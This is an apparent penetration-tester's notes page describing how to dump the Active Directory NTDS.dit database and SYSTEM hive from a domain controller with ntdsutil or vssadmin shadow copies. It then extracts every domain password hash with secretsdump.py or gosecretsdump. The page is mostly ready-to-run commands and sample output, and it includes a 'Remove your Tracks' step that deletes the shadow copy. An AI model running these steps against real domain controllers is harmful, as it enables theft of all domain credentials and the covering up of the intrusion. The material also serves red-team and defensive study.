---
title : "NTDS.dit Dump & Extract"
# pre : ' '
description : "How to dump NTDS.dit and extract the hashes with ShadowCopy and Secretsdump."
date : 2022-01-18T10:07:23+01:00
# hidden : true
# draft : true
weight : 50
# tags : ['']
---

On Domain Controller - create snapshot with `vssadmin.exe`.

## NTDSUtil

```plain
ntdsutil "activate instance ntds" "ifm" "create full C:\Windows\Temp\NTDS" quit quit
```

The following files can then be exported

```plain
C:\Windows\Temp\NTDS\Active Directory\ntds.dit
C:\Windows\Temp\NTDS\registry\SYSTEM
```

## Shadowcopy

### Step 1 - Create ShadowCopy

```plain
PS C:\> vssadmin.exe create shadow /for=C:
vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {3d781b5d-e053-41ad-85d4-5b8f1ffb2d42}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5
```

### Step 2 - Copy NTDS.dit and SYSTEM from ShadowCopy

NTDS:

```plain
PS C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\windows\ntds\ntds.dit c:\ntds.dit
```

SYSTEM:

```plain
PS C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\system32\config\system c:\system
```

Or use `reg save`

```plain
reg SAVE HKLM\SYSTEM c:\SYSTEM
```

You can also use [ShadowCopyView](https://www.nirsoft.net/utils/shadow_copy_view.html) if you prefer a GUI.

{{%resources fa_icon_class="far fa-file-archive" pattern=".*(zip)"/%}}

### Step 3 - Remove your Tracks

```plain
PS C:\> vssadmin delete shadows /shadow={3d781b5d-e053-41ad-85d4-5b8f1ffb2d42}
```

## Extract hashes

It can happen that [secretsdump.py]({{< ref"secretsdump-py" >}}) keeps looping and throwing out hashes. In this case, or maybe even preferably, use [Gosecretsdump]({{< ref "gosecretsdump" >}}).

### Secretsdump.py

```plain
secretsdump.py -system SYSTEM -ntds ntds.dit -hashes lmhash:nthash LOCAL -outputfile extracted-hashes -just-dc-ntlm -user-status -history
```

### Gosecretsdump

```plain
./gosecretsdump -system SYSTEM -ntds NTDS.DIT -history -status -out hashes.log
```

### Example NTDS/SYSTEM

Example `NTDS.dit` and `SYSTEM` files zipped below.

{{%resources fa_icon_class="far fa-file" pattern=".*(NTDS.DIT-SYSTEM)"/%}}

## URL List

- [Stealthbits.com - Extracting Password Hashes from the Ntds.dit File](https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/)
- [Thehacker.recipes - Dumping NTDS](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)
